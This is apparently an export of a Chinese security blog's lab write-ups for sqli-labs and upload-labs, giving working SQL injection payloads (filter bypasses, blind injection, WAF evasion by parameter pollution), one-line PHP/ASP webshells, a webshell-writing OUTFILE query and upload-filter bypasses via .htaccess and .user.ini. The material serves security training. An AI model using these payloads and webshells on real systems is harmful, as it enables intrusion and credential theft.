用\u0026amp;\u0026amp;代替and  注：在hackbar中输入\u0026amp;\u0026amp;时，需要自行URL编码为%26%26，否则会报错，而输入\n||不需要\nhttp://localhost/sqli-labs-master/Less-26/?id=1' aandnd(updatexml(1,concat(0x7e,database(),0x7e),1));%00,成功爆出数据库。\nhttp://localhost/sqli-labs-master/Less-26/?id=1'aandnd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1));%00爆出表名，其余操作类似。\n上边空格绕过，只成功了%a0,其他都报错\nhttp://localhost/sqli-labs-master/Less-26/?id=1'aandnd%a01=1;%00\nhttp://localhost/sqli-labs-master/Less-26/?id=111111'%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users;%00由于-被过滤所以联合注入时，id参数不能用负数了，可以随便找个字符或者大一点的数字，让他查询为空从而显示后边的。\nless-26a 本关关闭了报错。\nhttp://localhost/sqli-labs-master/Less-26a/?id=1') ;%00 成功返回正确信息，说明闭合方式为')\n其余操作和上关类似。http://localhost/sqli-labs-master/Less-26a/?id=.')%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users;%00\nless-27 function blacklist($id) { $id= preg_replace('/[\\/\\*]/',\u0026quot;\u0026quot;, $id);\t//strip out /* $id= preg_replace('/[--]/',\u0026quot;\u0026quot;, $id);\t//Strip out --. $id= preg_replace('/[#]/',\u0026quot;\u0026quot;, $id);\t//Strip out #. $id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/select/m',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/union/s',\u0026quot;\u0026quot;, $id);\t//Strip out union $id= preg_replace('/select/s',\u0026quot;\u0026quot;, $id);\t//Strip out select $id= preg_replace('/UNION/s',\u0026quot;\u0026quot;, $id);\t//Strip out UNION $id= preg_replace('/SELECT/s',\u0026quot;\u0026quot;, $id);\t//Strip out SELECT $id= preg_replace('/Union/s',\u0026quot;\u0026quot;, $id);\t//Strip out Union $id= preg_replace('/Select/s',\u0026quot;\u0026quot;, $id);\t//Strip out select return $id; }  本关过滤了select union等，但可以通过双写或者大小写绕过。\n很奇怪，商议关不能用的那些绕过空格的方法都可以用了……\npayload:http://localhost/sqli-labs-master/Less-27?id=.'%a0UNiON%a0SeleCt%a01,group_concat(username,password),3%a0from%a0users;%00\nless-27a 测试单引号页面正常，双引号页面不正常。http://192.168.2.222/-labs-master/Less-27a/?id=1\u0026quot;,猜测包裹参数的有双引号，注释掉后边，页面正常，http://localhost/sqli-labs-master/Less-27a/?id=1\u0026quot;;%00,说明闭合方式为双引号\u0026quot;\n过滤规则和上关一样。\npayload: http://localhost/sqli-labs-master/Less-27a/?id=1111\u0026quot;%0auniunionon%0aSeleCt%0a1,group_concat(username,password),3%0afrom%0ausers;%00\nless-28 测试单引号页面回显不正常，说明包裹参数的有但引号。http://localhost/sqli-labs-master/Less-28?id=1' ;%00截断后面的，页面还回显不正常，说明包裹参数的还有其他符号，在增加一个括号，回显正常http://localhost/sqli-labs-master/Less-28?id=1') ;%00,说明闭合方式为单引号括号')。\nfunction blacklist($id) { $id= preg_replace('/[\\/\\*]/',\u0026quot;\u0026quot;, $id);\t//strip out /* $id= preg_replace('/[--]/',\u0026quot;\u0026quot;, $id);\t//Strip out --. $id= preg_replace('/[#]/',\u0026quot;\u0026quot;, $id);\t//Strip out #. $id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. //$id= preg_replace('/select/m',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/union\\s+select/i',\u0026quot;\u0026quot;, $id);\t//Strip out UNION \u0026amp; SELECT. return $id; }  直接利用前面的知识绕过即可。l\nhttp://localhost/sqli-labs-master/Less-28?id=.')%0aunionunion%0aselect%0aselect%0a1,group_concat(username,password),3%0afrom%0ausers;%00成功绕过。\nless-28a function blacklist($id) { //$id= preg_replace('/[\\/\\*]/',\u0026quot;\u0026quot;, $id);\t//strip out /* //$id= preg_replace('/[--]/',\u0026quot;\u0026quot;, $id);\t//Strip out --. //$id= preg_replace('/[#]/',\u0026quot;\u0026quot;, $id);\t//Strip out #. //$id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. //$id= preg_replace('/select/m',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. //$id= preg_replace('/[ +]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. $id= preg_replace('/union\\s+select/i',\u0026quot;\u0026quot;, $id);\t//Strip out spaces. return $id; }  仅仅过滤了union select,直接用union union select select绕过即可。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less23-28a/","tags":["Sqli-labs"],"title":"Sqli-labs-less 22-28a"},{"content":"less-29 这里参考聂师傅、薛大佬以及Mysql注入天书\nemmm\u0026hellip;还有就是这关的 JSP 环境我没有搭建出来\u0026hellip;所以下面的截图来自于b站UP\n然后网上的教程搭建JSP环境是用 jspstudy 搭建的，如果有小伙伴想试试的话，可以参考这里：点击\nHTTP参数污染（HTTP Parameter Pollution）\n  jsp/tomcat使用getgetParameter(\u0026ldquo;id\u0026rdquo;)获取到的是第一个值，php/apache使用$_GET[\u0026ldquo;id\u0026rdquo;]获取的是第二个值，那么第一个id纯数字，第二个id的值，也就是，需要注入两个参数，第二个参数才是可以实现sql注入的\n  使用两个id的命令：index.jsp?id=1\u0026amp;id=2请求,服务器配置情况，客户端请求首先过tomcat，tomcat解析第一个参数，接下来tomcat去请求apache（php）服务器，apache解析最后一个参数。那最终返回客户端的应该是id=2的参数。\n  即jsp/tomcat使用getParameter(\u0026ldquo;id\u0026rdquo;)获取到的是第一个值，php/apache使用$_GET[\u0026ldquo;id\u0026rdquo;]获取的是第二个值，那么第一个id纯数字，第一个id的值我们往往在tomcat服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF的检测。该用法就是HPP（HTTP Parameter Pollution），http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。\n  waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容\n  图示：\n 服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。\n 这种解析的差异取决于服务器之间的差异\n回到题目：\n首先先试一下\n127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1\n然后对id=1进行注入即id=1'--+\n发现报错了，其实这里就是被 WAF 拦截\n关于 WAF 的详细解释，请看这里：点击\n这里我们使用两个id请求index.jsp?id=1\u0026amp;id=2,apache 解析后面的参数\nhttp://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1\u0026amp;id=2'--+\n接下来我们在后面的id进行注入，语句为联合查询的语句，请参照第一关的语句，这里只举第一句为例\nhttp://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1\u0026amp;id=-2'union select 1,2,group_concat(schema_name)from information_schema.schemata --+\n后面就和第一关一样了\nLess-30 这一关的包裹形式变为了双引号，其他地方均与29关相同\nless-31 此处包裹变为\u0026quot;），其他均与29，30关相同\nhttp://127.0.0.1:8080/sqli-labs/Less-31/index.jsp?id=1\u0026amp;id=-2\u0026quot;) union select 1,2,3--+\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less29-31%E7%BB%95%E8%BF%87waf/","tags":["Sqli-labs"],"title":"Sqli-labs-less 29-31 绕过WAF"},{"content":"less-07 前置知识\n由于是用 phpstudy 搭建的，所以需要进行一些配置\n1、在mysql命令行中输入show variables like '%secure%';查看secure-file-priv 如果为NULL\n则需要在 ././Mysql/my.ini 文件中加上一句secure_file_priv=\u0026quot;/\u0026quot;\n然后保存，再输入一下指令，发现\n这里说一下知识点\n secure-file-priv特性 secure-file-priv参数是用来限制LOAD DATA, SELECT \u0026hellip; OUTFILE, and LOAD_FILE()传到哪个指定目录的。\n secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制  如何查看secure-file-priv参数的值：\n在命令行中输入 show global variables like '%secure%';    常见一句话木马\nphp的一句话木马： \u0026lt;?php @eval($_POST['pass']);?\u0026gt; asp的一句话是： \u0026lt;%eval request (\u0026quot;pass\u0026quot;)%\u0026gt; aspx的一句话是： \u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%\u0026gt; \u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%\u0026gt;  详情请看这位师傅的链接\n 下面就可以开始第七关了\n先测试一下\nhttp://localhost/sqli-labs-master/Less-7/?id=1  发现这里提示Use outfile，那我们就从这里入手\n第一步还是和之前一样，先找出闭合方式\n经过试验发现闭合方式应该是')) 如图\nhttp://localhost/sqli-labs-master/Less-7/?id=1')) order by 3--+ 判断出为三列\n然后构造payload,放入一句话木马\nhttp://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,2,'\u0026lt;?php @eval($_POST[\u0026quot;crow\u0026quot;]);?\u0026gt;' into outfile \u0026quot;E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\test.php\u0026quot; --+\n然后蚁剑连接，拿下\nless-08 先输个1测试一下\nhttp://localhost/sqli-labs-master/Less-8/?id=1\n这又是 You are in........... 好家伙，思路明确了，盲注\n这里尝试出闭合方式是 '\n剩下的和第五关十分相似，可参考第五关\nless-09 此关名字为单引号时间盲注，其实也是和第五关一个意思，下面就写一句，后面的一样\n猜库名\n库名第一位是s\nhttp://localhost/sqli-labs-master/Less-9/?id=1' and If(ascii(substr(database(),2,1))=115,1,sleep(10))--+  猜表名\n表名第一位是u\nhttp://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=117,1,sleep(10))--+  猜字段名\n字段名第一位是u\nhttp://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117,1,sleep(10))--+  猜数据\n数据第一位是D\nhttp://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+  后面逐步拆解即可\nless-10 这关变成了基于时间的双引号盲注，后面和第九关一样，不做解释了\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less7-10/","tags":["Sqli-labs"],"title":"Sqli-labs-less 7-10"},{"content":"PS:这只是个菜鸟的小小记录，参考很多大佬的博客，有什么不正确的地方欢迎指正\nPASS-01 解题思路:（绕开前端JS验证）\n尝试：首先先挂了代理想上传个php用Burp抓个包看看，但是还没抓到包就提示该文件不允许上传，猜想应该是前段JS验证\n贴一下代码：\nfunction checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \u0026quot;\u0026quot;) { alert(\u0026quot;请选择要上传的文件!\u0026quot;); return false; } //定义允许上传的文件类型 var allow_ext = \u0026quot;.jpg|.png|.gif\u0026quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\u0026quot;.\u0026quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \u0026quot;|\u0026quot;) == -1) { var errMsg = \u0026quot;该文件不允许上传，请上传\u0026quot; + allow_ext + \u0026quot;类型的文件,当前文件类型为：\u0026quot; + ext_name; alert(errMsg); return false; } }  部分代码解释：\nvar //用来定义变量 alert //js函数，功能是弹出对话框并显示其中的内容 substring //jsp函数，用于提取字符串中介于两个指定下标之间的字符。 file.substring(file.lastIndexOf(\u0026quot;.\u0026quot;));//提取file变量·后面的字母，也就是后缀 substring：提取A到B之间的字符，jsp函数 string.substring (from A, to B) lastIndexOf( ) ：返回指定的字符串值最后出现的位置，如果指定第二个参数 start，则在一个字符串中的指定位置从后向前搜索。没有找到返回-1。 indexOf() ：返回指定的字符串值在字符串中首次出现的位置。如果没有找到匹配的字符串则返回 -1。 file_exists() ：检查文件或目录是否存在 语法：file_exists ( string $filename ) $filename：文件或目录的路径 （1）、查找字符串 \u0026quot;runoob\u0026quot; 最后出现的位置:（**lastindexOf**） var str=\u0026quot;I am from runoob，welcome to runoob site.\u0026quot;; var n=str.lastIndexOf(\u0026quot;runoob\u0026quot;); //输出28 （2）、查找字符串 \u0026quot;welcome\u0026quot;:（**indexOf**） var str=\u0026quot;Hello world, welcome to the universe.\u0026quot;; var n=str.indexOf(\u0026quot;welcome\u0026quot;); //输出 13  1、方法一（F12修改表单） 打开F12，找到上传部分，发现==CheckFile函数==，直接将这==onsubmit==将onsubmit事件删除即可，使点提交(submit)后不会被调用CheckFile函数进行检查就好\nCheckFile函数： 为asp实现检查某一文件是否存在的代码 onsubmit事件: onsubmit 事件会在表单中的确认按钮被点击时发生\n然后直接上传一句话木马php文件即可，接着蚁剑连接\n2、方法二（将PHP文件后缀改成允许上传的后缀，抓包改回php）\nPASS-02 解题思路：（MIME验证）（ content-type 检测） 贴一下代码\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } }  这里解释一下MIME: 你一定听说过文件内容类型或者说通过==抓包==你一定听说过 Content-Type: text/html 这种类似的，其实，这就是MIME。\nMIME(（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。\n常见的MME类型，例如：\n  超文本标记语言文本 .html,html text/htm\n  普通文本 .txt text/plain\n  RTF文本. rtf application/rtf\n  GIF图形 .gif image/gif\n  JPEG图形 . jpg image/jpeg\n  函数解释：\nstrrchr ()： 查找指定字符在字符串中的最后一次出现 语法：strrchr ( string $haystack , mixed $needle ) $haystack：被查找的字符串 $needle：出现的部分字符串 该函数返回needle在 haystack 字符串中的最后一次出现的位置后面haystack一部分， 拓展： strstr() - 查找字符串的首次出现 strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置  下面回到这个题 姿势一：将webshell 文件的后缀名改为图片类型 ，再利用 bs 抓包 修改文件后缀\n姿势二：直接上传 webshell 文件 ，利用 bs 修改 Content-type ：为 image/gif 绕过\nPASS-03 解题思路：黑名单验证，特殊后缀 这里贴一下源码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\u0026quot;YmdHis\u0026quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  部分代码解释：\n(1)trim() //函数移除字符串两侧的空白字符或其他预定义字符。 相关函数： ltrim() - 移除字符串左侧的空白字符或其他预定义字符 rtrim() - 移除字符串右侧的空白字符或其他预定义字符 详情:https://www.w3school.com.cn/php/func_string_trim.asp (2)deldot($file_name);//删除文件名末尾的点 (3)strrchr() // 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 实例: \u0026lt;?php //搜索 \u0026quot;What\u0026quot; 在字符串中的位置，并返回从该位置到字符串结尾的所有字符 echo strrchr(\u0026quot;Hello world! What a beautiful day!\u0026quot;,What); ?\u0026gt; 输出:What a beautiful day! 详情:https://www.w3school.com.cn/php/func_string_strrchr.asp (4)strtolower() // 函数把字符串转换为小写。 (5)str_ireplace() //函数替换字符串中的一些字符（不区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是一个数组，那么它将返回一个数组。 如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换 如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 注释：该函数不区分大小写。请使用 str_replace() 函数来执行区分大小写的搜索。 注释：该函数是二进制安全的。 语法:str_ireplace(find,replace,string,count) -------------------------------------------- |find |必需。规定要查找的值。 | -------------------------------------------- |replace |必需。规定替换 find 中的值的值。| -------------------------------------------- |string |必需。规定被搜索的字符串。 | -------------------------------------------- |count |可选。一个变量，对替换数进行计数 | --------------------------------------------  源码分析：\n  黑名单不全，想使用大小写、‘.’号（如：1.php.）、特殊字符（如：1.php::$DATA）、Apache文件后缀解析（1.php.xxx为1.php）等方式绕过，但查看源码后，发现都给过滤掉了。 解题姿势一： 使用一些特殊的后缀：\n  php：php3、php4、phtml\n  jsp：jspx、jspf\n  asp：asa、cer\n  使用特殊后缀之后，发现还是不行，返回结果为空，测试\u0026lt;?php phpinfo();?\u0026gt;也读不出来。看wp和百度后，是由于环境是phpstudy搭建的，里面把后缀给限制了，所以改一下httpd.conf文件里的#AddType application/x-httpd-php .php .phtml为AddType application/x-httpd-php .php .phtml .php3 .php4 ==记得去掉#号。==\n但是：我是用V8.0的phpstudy,发现 httpd.conf 文件里居然没有上述代码，通过查资料发现，找到这些代码 在 \u0026lt;/IfMndule\u0026gt;上面添加以下代码AddType application/x-httpd-php .php .phtml .php3\n  ==但是== 是我想的太简单了，加上依旧无法解析php3，查了一下apache的版本号是==2.4.39==，我又用phpstudy2018尝试了一下Apache的版本号是==2.4.23==（由于2018版没有直接写出版本号，可以执行cmd命令行查看 切到phpstudy/apache/bin 目录。执行httpd -v可查看版本号），旧版本就会出现#AddType application/x-httpd-php .php .phtml这些代码，具体原因目前还不知道\u0026hellip;就先使用2018版\n回到题目 这里我们试一下php3，将webshell的后缀改成.php3，上传成功后复制上传地址，蚁剑连接\n解题姿势二： 上传图片马，然后BP拦截，修改后缀为phtml,php3,php4,php5,pht\n蚁剑连接\n解题姿势三：(.htaccess绕过)\n这个有好多坑好多坑好多坑\n首先，我一开始用的是phpstudy V8.0搭建的，然后发现即使按照百度上的方法，即：\n Apache要使.htaccess文件生效要在httpd.config 配置两个地方(百度搜的)\nOptions FollowSymLinks\nAllowOverride None\n改为：\nOptions FollowSymLinks AllowOverride All\n把LoadModule rewrite_module modules/mod_rewrite.so前面的注释符号#删除\n 依旧还是不行，试了好久好久\u0026hellip; 终于！！！找到了这个大佬的博客 链接.\n里面详尽的讲了为什么新版不行，所以我换了phpstudy 2018版\n但是，这个题好像无法使用.htaccess绕过，为什么呢？因为通过查资料发现，使用.htaccess绕过来讲其他后缀解析为php是需要没有前缀的，只需要.htaccess这个文件（也就是.前面是没有任何东西的）\n但是这道题的有一行代码是这样的\n$img_path = UPLOAD_PATH.'/'.date(\u0026quot;YmdHis\u0026quot;).rand(1000,9999).$file_ext;  这里会通过上传日期来命名上传文件的，也就是得到的是个xxx.htaccess文件，这样的话就无法解析其他后缀为php了\nPASS-04 这里先贴一下代码\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.php1\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.pHp1\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  代码和PASS-03差距不大，就不做过多解释\n解题思路：黑名单验证，.htaccess绕过，相比于PASS-03，黑名单更加多了，使用.htaccess绕过\n Apache要使.htaccess文件生效要在httpd.config 配置两个地方(百度搜的)\nOptions FollowSymLinks\nAllowOverride None\n改为：\nOptions FollowSymLinks AllowOverride All\n把LoadModule rewrite_module modules/mod_rewrite.so前面的注释符号#删除\n 解题姿势一： 先上传一个.htaccess文件，内容如下：\nSetHandler application/x-httpd-php \n这样所有文件都会当成php来解析\n然后再上传一个图片马，复制地址，蚁剑连接\n解题姿势二： 后缀修改为：点+空+点 上传图片马，BP抓包，然后将图片马后缀 .png 改为 .php +点+空+点\nPASS-05 贴一下代码\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  代码也和上一关差不多，不做解释了\n解题思路：黑名单验证，.user.ini.\n  与前两关相似，再过滤了.htaccess，但是还有个ini配置文件可以利用。\n  先上传一个以auto_prepend_file=1.png为内容的.user.ini文件，然后再上传一个内容为php的一句话的脚本，命名为1.png，.user.ini文件里的意思是：==所有的php文件都自动包含1.png文件。.user.ini相当于一个用户自定义的php.ini。==\n  提示是：存在readme.php这个文件。  复制图像地址后，将文件名改为==readme.php==，然后密码设置为一句话的密码，蚁剑连接成功。\n  注：这里php版本要高一些才能使用 然后蚁剑连接，成功\nPASS-06 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\u0026quot;YmdHis\u0026quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } 